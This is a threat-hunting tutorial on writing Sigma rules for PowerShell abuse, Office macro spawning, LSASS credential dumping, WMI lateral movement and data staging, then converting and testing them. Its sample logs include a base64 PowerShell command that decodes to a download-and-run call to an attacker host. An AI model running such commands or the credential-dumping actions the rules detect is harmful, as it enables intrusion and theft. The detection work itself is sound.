# Demo 03: Writing and Converting Sigma Rules for Threat Hunting

**Duration:** ~35 minutes

**Difficulty:** Intermediate

**Prerequisites:** Reading material section 13, Python 3, basic YAML knowledge

---

## Overview

In this demo, we will:

1. Write Sigma rules from scratch targeting FIN-STORM TTPs
1. Convert rules to multiple SIEM formats using sigma-cli
1. Test rules against sample log data
1. Build a rule collection and automate conversion

---

## Setup

### Install sigma-cli

```bash
# Create a virtual environment
python3 -m venv sigma-env
source sigma-env/bin/activate  # Linux/Mac
# sigma-env\Scripts\activate    # Windows

# Install sigma-cli and backends
pip install sigma-cli

# Install SIEM backends
sigma-cli plugin install splunk
sigma-cli plugin install elastic-lucene
sigma-cli plugin install elasticsearch-eql
sigma-cli plugin install azure-monitor  # Microsoft Sentinel (KQL)
sigma-cli plugin install chronicle      # Google Chronicle

# Verify installation
sigma-cli --version
sigma-cli plugin list
```

Create a working directory:

```console
mkdir -p ~/sigma-demo/{rules,converted,tests}
cd ~/sigma-demo
```

---

## Step 1: Writing Your First Sigma Rule

### Rule 1: PowerShell Encoded Command (T1059.001)

Create `rules/ps_encoded_command.yml`:

```yaml
title: PowerShell Execution with Encoded Command
id: 4a5e2f1b-3c7d-4e8a-9b0c-1d2e3f4a5b6c
status: experimental
description: |
  Detects PowerShell or PowerShell Core execution using encoded command
  parameters, commonly used by threat actors to obfuscate malicious scripts
  and bypass simple command-line logging.

  FIN-STORM has been observed using this technique for staging.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe
author: SecureBank Threat Hunt Team
date: 2024/03/15
modified: 2024/03/15
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_encoded:
        CommandLine|contains:
            - ' -EncodedCommand '
            - ' -encodedcommand '
            - ' -enc '
            - ' -ec '
    selection_base64_indicators:
        CommandLine|contains:
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-NonI'
            - '-NonInteractive'
            - '-Exec Bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and (selection_encoded or
               (selection_base64_indicators and
                selection_base64_indicators))
falsepositives:
    - Legitimate administrative scripts using encoded commands
    - Software deployment tools (SCCM, PDQ Deploy, etc.)
    - Some security tools (verify before acting)
level: medium
tags:
    - attack.execution
    - attack.t1059.001
    - attack.defense_evasion
    - attack.t1027
```

---

### Rule 2: Office Application Spawning PowerShell (T1566.001 → T1059.001)

Create `rules/office_spawns_powershell.yml`:

```yaml
title: Microsoft Office Application Spawning PowerShell
id: 9b8c7d6e-5f4a-3b2c-1d0e-9f8a7b6c5d4e
status: stable
description: |
  Detects Microsoft Office applications (Word, Excel, PowerPoint, Outlook)
  spawning PowerShell processes. This is a common technique used in
  macro-enabled phishing campaigns to execute malicious code.

  Observed in FIN-STORM phishing campaigns using macro-enabled documents.
references:
    - https://attack.mitre.org/techniques/T1566/001/
    - https://attack.mitre.org/techniques/T1059/001/
author: SecureBank Threat Hunt Team
date: 2024/03/15
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\WINWORD.EXE'
            - '\EXCEL.EXE'
            - '\POWERPNT.EXE'
            - '\OUTLOOK.EXE'
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\wmic.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Rare legitimate admin scripts invoked from Office
    - Some Office add-ins with automation features
level: high
tags:
    - attack.initial_access
    - attack.t1566.001
    - attack.execution
    - attack.t1059.001
    - attack.defense_evasion
    - attack.t1218
```

---

### Rule 3: LSASS Memory Access (T1003.001)

Create `rules/lsass_memory_access.yml`:

```yaml
title: Suspicious LSASS Memory Access
id: 3d4e5f6a-7b8c-9d0e-1f2a-3b4c5d6e7f8a
status: experimental
description: |
  Detects suspicious access to LSASS (Local Security Authority Subsystem Service)
  memory, which is the primary technique for credential dumping.
  Mimikatz and its variants commonly access LSASS with specific access rights.
references:
    - https://attack.mitre.org/techniques/T1003/001/
    - https://github.com/gentilkiwi/mimikatz
author: SecureBank Threat Hunt Team
date: 2024/03/15
logsource:
    category: process_access
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1fffff'   # PROCESS_ALL_ACCESS
            - '0x1010'     # PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION
            - '0x1410'     # Common Mimikatz access mask
            - '0x143a'     # Common Mimikatz access mask
            - '0x40'       # PROCESS_DUP_HANDLE (procdump)
    filter_legitimate:
        SourceImage|contains:
            - '\MsMpEng.exe'           # Windows Defender
            - '\SenseIR.exe'           # Microsoft Defender for Endpoint
            - '\MsSense.exe'           # Microsoft Defender for Endpoint
            - '\SentinelAgent.exe'     # SentinelOne
            - '\cb.exe'                # Carbon Black
            - '\CylanceSvc.exe'        # Cylance
            - '\bdservicehost.exe'     # Bitdefender
            - '\csrss.exe'             # System process
            - '\wininit.exe'           # System process
    condition: selection and not filter_legitimate
falsepositives:
    - Legitimate security tools (add to filter list)
    - System debugging tools in authorized use
level: critical
tags:
    - attack.credential_access
    - attack.t1003.001
```

---

### Rule 4: WMI Remote Command Execution (T1047)

Create `rules/wmi_remote_execution.yml`:

```yaml
title: WMI Remote Process Execution
id: 1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d
status: stable
description: |
  Detects WMI (Windows Management Instrumentation) being used for remote
  command execution. This is a common lateral movement technique.
  Specifically detects wmiprvse.exe spawning command shells, and wmic.exe
  with /node: parameter for remote execution.
references:
    - https://attack.mitre.org/techniques/T1047/
author: SecureBank Threat Hunt Team
date: 2024/03/15
logsource:
    category: process_creation
    product: windows
detection:
    selection_wmiprvse_parent:
        ParentImage|endswith: '\WmiPrvSE.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
    selection_wmic_remote:
        Image|endswith: '\WMIC.exe'
        CommandLine|contains: '/node:'
    condition: selection_wmiprvse_parent or selection_wmic_remote
falsepositives:
    - Legitimate WMI-based system management scripts
    - Some monitoring agents use WMI
    - SCCM and other deployment tools
level: medium
tags:
    - attack.lateral_movement
    - attack.t1047
    - attack.execution
    - attack.t1059.003
```

---

### Rule 5: Data Staging in Common Directories (T1074.001)

Create `rules/data_staging.yml`:

```yaml
title: Suspicious Data Staging in System Directories
id: 8f9a0b1c-2d3e-4f5a-6b7c-8d9e0f1a2b3c
status: experimental
description: |
  Detects creation of archive files in commonly-used staging directories.
  Threat actors stage collected data before exfiltration in locations like
  C:\ProgramData\, C:\Windows\Temp\, C:\Users\Public\.

  FIN-STORM observed staging data in C:\ProgramData\Microsoft\Crypto\
references:
    - https://attack.mitre.org/techniques/T1074/001/
author: SecureBank Threat Hunt Team
date: 2024/03/15
logsource:
    category: file_event
    product: windows
    service: sysmon
detection:
    selection_directories:
        TargetFilename|startswith:
            - 'C:\ProgramData\Microsoft\Crypto\'
            - 'C:\ProgramData\Microsoft\Windows\'
            - 'C:\Windows\Temp\'
            - 'C:\Users\Public\'
    selection_archive_extensions:
        TargetFilename|endswith:
            - '.zip'
            - '.rar'
            - '.7z'
            - '.tar'
            - '.gz'
            - '.cab'
    filter_system:
        Image|startswith:
            - 'C:\Windows\system32\'
            - 'C:\Windows\SysWOW64\'
        Image|endswith:
            - '\svchost.exe'
            - '\taskhostw.exe'
    condition: (selection_directories and selection_archive_extensions)
               and not filter_system
falsepositives:
    - Legitimate backup software staging archives
    - Windows Update processes
    - Software installers using temp directories
level: medium
tags:
    - attack.collection
    - attack.t1074.001
    - attack.exfiltration
```

---

## Step 2: Convert Rules to SIEM Formats

### Convert All Rules to Splunk

```console
# Convert all rules at once
sigma-cli convert -t splunk rules/ -o converted/splunk/

# Or individual rule
sigma-cli convert -t splunk rules/ps_encoded_command.yml

# Convert with Sysmon pipeline (better field mappings)
sigma-cli convert -t splunk -p sysmon rules/lsass_memory_access.yml
```

**Expected Splunk output for ps_encoded_command.yml:**

```text
(Image="*\\powershell.exe" OR Image="*\\pwsh.exe")
(CommandLine="* -EncodedCommand *" OR CommandLine="* -encodedcommand *" OR CommandLine="* -enc *" OR CommandLine="* -ec *")
```

### Convert to Elasticsearch

```console
# Elasticsearch Query DSL
sigma-cli convert -t elasticsearch rules/lsass_memory_access.yml

# Elasticsearch EQL (Event Query Language)
sigma-cli convert -t elasticsearch-eql rules/office_spawns_powershell.yml
```

**Expected EQL output:**

```text
process where process.parent.executable : ("*\\WINWORD.EXE", "*\\EXCEL.EXE", "*\\POWERPNT.EXE", "*\\OUTLOOK.EXE") and
  process.executable : ("*\\powershell.exe", "*\\pwsh.exe", "*\\cmd.exe", "*\\wscript.exe", "*\\cscript.exe", "*\\mshta.exe", "*\\wmic.exe")
```

### Convert to Microsoft Sentinel KQL

```console
sigma-cli convert -t azure-monitor rules/wmi_remote_execution.yml
```

**Expected KQL output:**

```kql
SecurityEvent
| where TimeGenerated >= ago(1d)
| where (ParentProcessName endswith "\\WmiPrvSE.exe" and
         (NewProcessName endswith "\\cmd.exe" or
          NewProcessName endswith "\\powershell.exe"))
  or (NewProcessName endswith "\\WMIC.exe" and
      CommandLine contains "/node:")
```

### Bulk Convert and Save

Create `convert_all.sh`:

```bash
#!/bin/bash
# Convert all sigma rules to multiple SIEM formats

RULES_DIR="./rules"
OUTPUT_DIR="./converted"
BACKENDS=("splunk" "elasticsearch-eql" "azure-monitor")

mkdir -p "$OUTPUT_DIR"

for backend in "${BACKENDS[@]}"; do
    echo "[*] Converting rules to $backend format..."
    mkdir -p "$OUTPUT_DIR/$backend"

    for rule in "$RULES_DIR"/*.yml; do
        rulename=$(basename "$rule" .yml)
        echo "    Converting: $rulename"

        sigma-cli convert \
            -t "$backend" \
            -p sysmon \
            "$rule" \
            2>/dev/null > "$OUTPUT_DIR/$backend/${rulename}.txt" || \
        echo "    [!] Conversion failed for $rulename in $backend"
    done

    echo "[✓] $backend conversion complete"
done

echo ""
echo "Converted rules:"
find "$OUTPUT_DIR" -name "*.txt" | sort
```

```console
chmod +x convert_all.sh && ./convert_all.sh
```

---

## Step 3: Test Rules Against Sample Log Data

### Create Sample Log Data

Create `tests/sample_logs.json`:

```json
[
  {
    "EventID": 1,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -NoProfile -NonInteractive -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBhAHQAdABhAGMAawBlAHIALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "User": "CORP\\jsmith",
    "ComputerName": "WORKSTATION-042",
    "timestamp": "2024-03-15T14:23:01Z",
    "expected_detection": "office_spawns_powershell AND ps_encoded_command"
  },
  {
    "EventID": 1,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\backup.ps1",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "User": "NT AUTHORITY\\SYSTEM",
    "ComputerName": "SERVER-001",
    "timestamp": "2024-03-15T02:00:00Z",
    "expected_detection": "None (legitimate scheduled task)"
  },
  {
    "EventID": 10,
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "SourceImage": "C:\\Users\\jsmith\\Downloads\\procdump.exe",
    "GrantedAccess": "0x1fffff",
    "User": "CORP\\jsmith",
    "ComputerName": "WORKSTATION-042",
    "timestamp": "2024-03-15T14:25:33Z",
    "expected_detection": "lsass_memory_access"
  },
  {
    "EventID": 10,
    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
    "SourceImage": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
    "GrantedAccess": "0x1410",
    "User": "NT AUTHORITY\\SYSTEM",
    "ComputerName": "SERVER-001",
    "timestamp": "2024-03-15T03:15:00Z",
    "expected_detection": "None (filtered - Windows Defender)"
  },
  {
    "EventID": 1,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "User": "CORP\\admin",
    "ComputerName": "SERVER-DB-01",
    "timestamp": "2024-03-15T22:44:11Z",
    "expected_detection": "wmi_remote_execution"
  }
]
```

### Write a Rule Tester

Create `tests/test_rules.py`:

```python
#!/usr/bin/env python3
"""
Simple Sigma rule tester against sample log data
Tests rule logic without requiring a full SIEM
"""

import json
import yaml
import re
from pathlib import Path

def load_sample_logs(log_file):
    with open(log_file) as f:
        return json.load(f)

def check_condition(log_entry, selection):
    """Check if a log entry matches a Sigma selection"""
    for field, value in selection.items():
        # Parse field modifiers
        parts = field.split('|')
        field_name = parts[0]
        modifiers = parts[1:] if len(parts) > 1 else []

        # Get actual field value from log
        log_value = log_entry.get(field_name, '')
        if not log_value:
            return False

        log_value = str(log_value).lower()

        # Handle list values (OR logic)
        if isinstance(value, list):
            matched = False
            for v in value:
                v_lower = str(v).lower()
                if 'endswith' in modifiers:
                    if log_value.endswith(v_lower):
                        matched = True
                        break
                elif 'startswith' in modifiers:
                    if log_value.startswith(v_lower):
                        matched = True
                        break
                elif 'contains' in modifiers:
                    if v_lower in log_value:
                        matched = True
                        break
                else:
                    if log_value == v_lower:
                        matched = True
                        break
            if not matched:
                return False
        else:
            v_lower = str(value).lower()
            if 'endswith' in modifiers:
                if not log_value.endswith(v_lower):
                    return False
            elif 'startswith' in modifiers:
                if not log_value.startswith(v_lower):
                    return False
            elif 'contains' in modifiers:
                if v_lower not in log_value:
                    return False
            else:
                if log_value != v_lower:
                    return False

    return True

def test_rule_against_logs(rule_file, logs):
    """Test a Sigma rule against sample logs"""

    with open(rule_file) as f:
        rule = yaml.safe_load(f)

    print(f"\n{'='*60}")
    print(f"Rule: {rule['title']}")
    print(f"Level: {rule['level'].upper()}")
    print(f"{'='*60}")

    detection = rule.get('detection', {})
    selections = {k: v for k, v in detection.items()
                  if k != 'condition' and isinstance(v, dict)}
    filters = {k: v for k, v in detection.items()
               if k.startswith('filter') and isinstance(v, dict)}

    hits = []
    for i, log in enumerate(logs):

        # Check each selection
        matched_selections = {}
        for sel_name, sel_criteria in selections.items():
            matched_selections[sel_name] = check_condition(log, sel_criteria)

        # Check filters
        matched_filters = {}
        for filt_name, filt_criteria in filters.items():
            matched_filters[filt_name] = check_condition(log, filt_criteria)

        # Simple condition evaluation (simplified for demo)
        any_selection_matched = any(matched_selections.values())
        any_filter_matched = any(matched_filters.values())

        if any_selection_matched and not any_filter_matched:
            hits.append({
                'log_index': i,
                'log': log,
                'matched_selections': [k for k, v in matched_selections.items() if v],
                'expected': log.get('expected_detection', 'unknown')
            })

    if hits:
        print(f"[!] ALERTS TRIGGERED: {len(hits)}")
        for hit in hits:
            print(f"\n    Log #{hit['log_index']}: {hit['log'].get('ComputerName')} "
                  f"- User: {hit['log'].get('User')}")
            print(f"    Timestamp: {hit['log'].get('timestamp')}")
            print(f"    Matched: {', '.join(hit['matched_selections'])}")
            print(f"    Expected: {hit['expected']}")
            if 'CommandLine' in hit['log']:
                cmd = hit['log']['CommandLine'][:80]
                print(f"    CommandLine: {cmd}...")
    else:
        print("[✓] No alerts triggered")

    return hits

if __name__ == "__main__":
    logs = load_sample_logs("tests/sample_logs.json")
    rules_dir = Path("rules")

    all_hits = {}
    for rule_file in sorted(rules_dir.glob("*.yml")):
        hits = test_rule_against_logs(rule_file, logs)
        all_hits[rule_file.name] = len(hits)

    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    for rule, count in all_hits.items():
        status = f"[!] {count} hit(s)" if count > 0 else "[✓] No hits"
        print(f"  {rule:<45} {status}")
```

**Run the tests:**

```console
cd ~/sigma-demo
python3 tests/test_rules.py
```

---

## Step 4: Build a Sigma Rule Pipeline

Create an automated pipeline that converts rules and outputs hunting queries:

```bash
#!/bin/bash
# sigma_pipeline.sh - Full Sigma hunting pipeline

echo "=== Sigma Threat Hunting Pipeline ==="
echo "Date: $(date)"

# Directories
RULES="./rules"
OUTPUT="./hunting_queries"
mkdir -p "$OUTPUT"

# 1. Validate all rules
echo ""
echo "[1/4] Validating rules..."
sigma-cli check "$RULES"/*.yml
echo "Validation complete"

# 2. Convert to Splunk
echo ""
echo "[2/4] Converting to Splunk SPL..."
for rule in "$RULES"/*.yml; do
    name=$(basename "$rule" .yml)
    output="$OUTPUT/splunk_${name}.spl"
    sigma-cli convert -t splunk -p sysmon "$rule" > "$output" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "  [✓] $name.yml → splunk_${name}.spl"
    else
        echo "  [✗] Failed: $name.yml"
    fi
done

# 3. Convert to Elasticsearch EQL
echo ""
echo "[3/4] Converting to Elasticsearch EQL..."
for rule in "$RULES"/*.yml; do
    name=$(basename "$rule" .yml)
    output="$OUTPUT/elastic_${name}.eql"
    sigma-cli convert -t elasticsearch-eql "$rule" > "$output" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "  [✓] $name.yml → elastic_${name}.eql"
    fi
done

# 4. Generate hunt playbook
echo ""
echo "[4/4] Generating hunt playbook..."
cat > "$OUTPUT/hunt_playbook.md" << 'EOF'
# FIN-STORM Threat Hunt Playbook
Generated: $(date)

## Detection Rules

EOF

for rule in "$RULES"/*.yml; do
    name=$(basename "$rule" .yml)
    title=$(grep "^title:" "$rule" | head -1 | cut -d':' -f2 | xargs)
    level=$(grep "^level:" "$rule" | head -1 | cut -d':' -f2 | xargs)
    echo "### $title (Level: $level)" >> "$OUTPUT/hunt_playbook.md"
    echo "" >> "$OUTPUT/hunt_playbook.md"
    echo "**Splunk Query:**" >> "$OUTPUT/hunt_playbook.md"
    echo '```' >> "$OUTPUT/hunt_playbook.md"
    cat "$OUTPUT/splunk_${name}.spl" >> "$OUTPUT/hunt_playbook.md"
    echo '```' >> "$OUTPUT/hunt_playbook.md"
    echo "" >> "$OUTPUT/hunt_playbook.md"
done

echo ""
echo "=== Pipeline Complete ==="
echo "Output files in: $OUTPUT/"
ls -la "$OUTPUT/"
```

---

## Step 5: Rule Quality Checklist

When writing Sigma rules, verify:

```markdown
## Sigma Rule Quality Checklist

### Required Fields
- [ ] title: Descriptive, specific
- [ ] id: Valid UUID (generate with: python3 -c "import uuid; print(uuid.uuid4())")
- [ ] status: experimental/test/stable
- [ ] description: What does this rule detect and why?
- [ ] logsource: Correct category/product/service
- [ ] detection: Valid selections and condition
- [ ] falsepositives: Document known benign matches
- [ ] level: informational/low/medium/high/critical

### Quality Checks
- [ ] Rule converts without errors in target SIEM
- [ ] Rule tested against known-bad logs (true positive)
- [ ] Rule tested against known-good logs (no false positives)
- [ ] False positive filter documented and implemented
- [ ] Tags include relevant ATT&CK technique IDs
- [ ] References link to ATT&CK and other documentation

### Common Mistakes
- [ ] Field names match actual log fields (check logsource)
- [ ] Case sensitivity handled (use |contains or |endswith for paths)
- [ ] Condition logic is correct (selection AND NOT filter)
- [ ] List values are actually lists in YAML
```

---

## Summary

In this demo you:

1. Wrote 5 Sigma rules targeting FIN-STORM TTPs (T1059.001, T1566.001, T1003.001, T1047, T1074.001)
1. Converted rules to Splunk SPL, Elasticsearch EQL, and Microsoft Sentinel KQL
1. Tested rules against sample log data
1. Built an automated conversion pipeline

**Key principles:**

* Start with ATT&CK technique documentation
* Be specific enough to reduce false positives
* Always document false positives
* Test against real data before deploying
* Rules become reusable assets—maintain a library

**Next steps:**

* Submit rules to SigmaHQ for community review
* Implement rules in your SIEM
* Tune based on false positive feedback
* Link Sigma rules to MISP events for full intel integration
